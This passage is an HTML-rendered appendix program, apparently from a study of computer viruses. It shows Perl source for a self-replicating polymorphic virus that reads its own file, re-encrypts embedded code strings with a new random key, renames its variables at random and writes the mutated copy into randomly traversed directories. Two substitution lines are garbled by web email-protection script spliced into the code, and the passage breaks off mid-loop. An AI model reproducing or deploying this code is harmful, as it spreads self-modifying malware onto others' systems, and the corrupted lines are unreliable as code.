&nbsp; <span style="color: #cc66cc;">81</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/return.html"><span style="color: #000066;">return</span></a> <span style="color: #0000ff;">$todecrypt</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">82</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h3><a name="pa3"></a>A.3 Example program chapter 4</h3>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&lt;$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@self</span> <span style="color: #339933;">=</span> <span style="color: #009999;">&lt;SELF&gt;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;IAWKJAqAI2aKHKJ8ahk8JAd&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;ZK<span style="color: #000099; font-weight: bold;">\@</span>A<span style="color: #000099; font-weight: bold;">\@</span>8kG8lJA8bAI2aKHKJ&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$lenofen</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@code</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotate</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">34125</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotreplace</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">500000</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">@switchthese</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;OUT2FILE&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #ff0000;">&quot;SELF&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;createsubstitutes&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;encrypt&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">15</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;decrypt&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;newname&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">16</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;choose&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;code&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;coin&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;counter&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;dircount&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #ff0000;">&quot;directory&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;dirlist&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;elen&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;enccounter&quot;</span><span style="color: #339933;">,</span> &nbsp; <br/>
&nbsp; <span style="color: #cc66cc;">19</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;entry&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;filename&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #ff0000;">&quot;length&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">20</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;lenofen&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">&quot;line&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;listing&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">21</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;luckyfile&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;newc&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;oldc&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">22</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;randomadd&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;randomchar&quot;</span><span style="color: #339933;">,</span> &nbsp; <span style="color: #ff0000;">&quot;randomlen&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<br/>
&nbsp; <span style="color: #cc66cc;">23</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;randomvar&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp;<span style="color: #ff0000;">&quot;rotate&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;rotcount&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">24</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;rotreplace&quot;</span><span style="color: #339933;">,</span> &nbsp; <span style="color: #ff0000;">&quot;self&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;swcounter&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">25</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;switchthese&quot;</span><span style="color: #339933;">,</span> &nbsp;<span style="color: #ff0000;">&quot;todcrypt&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #ff0000;">&quot;toecrypt&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; <span style="color: #cc66cc;">26</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">&quot;traverse&quot;</span><span style="color: #339933;">,</span> &nbsp; &nbsp; <span style="color: #ff0000;">&quot;variable&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">27</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">28</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">&amp;createsubstitutes</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">29</span> <span style="color: #339933;">:</span> <span style="color: #0000ff;">&amp;newname</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">30</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">31</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>OUT2FILE<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$filename&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">32</span> <span style="color: #339933;">:</span> <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$line</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@self</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">33</span> <span style="color: #339933;">:</span> &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/$rotate/</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">'$rotate = '</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$rotreplace;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">34</span> <span style="color: #339933;">:</span> &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$enccounter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$enccounter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$lenofen</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$enccounter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">35</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/^\$code\[$enccounter\]/</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">36</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$oldc</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;decrypt</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$code</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$enccounter</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">37</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;$oldc<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">38</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$newc</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;encrypt</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$oldc</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">39</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">'$code['</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$enccounter] = <span style="color: #000099; font-weight: bold;">\&quot;</span>$newc<span style="color: #000099; font-weight: bold;">\&quot;</span>;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">40</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/\@/\\\@/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">41</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;$line&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">42</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">43</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">44</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$swcounter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$swcounter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$swcounter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">45</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/$switchthese[$swcounter]/$randomvar[$swcounter]/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">46</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">47</span> <span style="color: #339933;">:</span> &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> OUT2FILE <span style="color: #0000ff;">$line</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">48</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">49</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>OUT2FILE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">50</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">51</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">52</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> createsubstitutes <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">53</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">$length</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@switchthese</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">--;</span><br/>
&nbsp; <span style="color: #cc66cc;">54</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$counter</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$counter</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$length</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$counter</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">55</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$randomlen</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">56</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$randomlen</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">5</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">57</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$variable</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$randomlen</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">58</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">26</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">59</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">97</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">60</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$randomvar</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$counter</span><span style="color: black;">&#93;</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$randomchar</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">61</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">62</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">63</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">64</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">65</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> decrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">66</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$todcrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">67</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotate</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">68</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$todcrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">tr/0-9.@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3a7b17605b1740155b17407a7b1760140a1703">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">69</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">70</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/return.html"><span style="color: #000066;">return</span></a> <span style="color: #0000ff;">$todcrypt</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">71</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">72</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">73</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> encrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">74</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$toecrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">75</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotreplace</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">76</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$toecrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7b0f09541a56013b3a5621554b5642">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/0-9.@A-Za-z/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">77</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">78</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/return.html"><span style="color: #000066;">return</span></a> <span style="color: #0000ff;">$toecrypt</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">79</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">80</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">81</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> newname <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">82</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">$traverse</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;../&quot;</span> x <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">15</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">83</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<br/>
&nbsp; <span style="color: #cc66cc;">84</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #b1b100;">do</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">85</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$tracount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$tracount</span> <span style="color: #339933;">&lt;=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">15</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$tracount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
